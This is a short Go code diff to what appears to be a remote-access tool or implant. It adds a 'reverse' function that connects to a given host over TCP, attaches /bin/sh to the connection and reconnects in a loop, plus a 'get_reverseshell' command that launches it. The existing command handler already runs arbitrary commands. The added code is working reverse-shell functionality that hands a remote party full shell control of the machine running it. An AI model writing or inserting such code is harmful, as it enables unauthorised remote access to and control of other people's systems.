@@ -76,6 +76,23 @@ func Decryption(message string, local_priv_key rsa.PrivateKey) string {
 	return string(plaintext)
 }
 
+func reverse(host string) {
+	connection, err := net.Dial("tcp", host)
+	if nil != err {
+		if nil != connection {
+			connection.Close()
+		}
+		time.Sleep(time.Minute)
+		reverse(host)
+	}
+
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
+	cmd.Run()
+	connection.Close()
+	reverse(host)
+}
+
 func InterpretCommand(command string) string {
 	//Command interpretation very basic stuff here
 	command = strings.Trim(command, "\n")
@@ -88,6 +105,9 @@ func InterpretCommand(command string) string {
 		output_byte, _ := exec.Command(payload).Output()
 		output := fmt.Sprintf("%s", output_byte)
 		return output
+	} else if fields[0] == "get_reverseshell" {
+		go reverse(fields[1])
+		return "good"
 	} else {
 		return "Unknown command try help"
 	}
